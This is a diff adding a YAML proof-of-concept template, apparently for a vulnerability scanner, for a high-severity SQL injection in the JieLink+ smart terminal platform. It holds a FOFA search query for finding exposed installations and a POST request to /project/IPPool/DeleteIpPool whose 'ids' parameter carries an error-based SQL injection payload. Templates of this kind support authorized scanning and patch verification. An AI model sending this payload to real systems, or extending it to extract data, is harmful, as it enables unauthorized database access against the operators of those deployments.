@@ -1,0 +1,21 @@
+id: poc-yaml-jielink-plus-deleteippool-sqli
+info:
+  name: JieLink+智能终端操作平台 DeleteIpPool SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: JeLink+
+  fofa: title="JieLink+智能终端操作平台"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /project/IPPool/DeleteIpPool
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: ids=-99 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,(SELECT md5({{.t1}})),0x7e,0x7e))s),
+    8446744073709551610, 8446744073709551610)))&syncFlag=1
+  expression: "status_code == 200 && \ncontains(body,\"value\") &&\ncontains(body,t2)\
+    \ &&\ncontains(body,\"out\")\n"
+transport: http
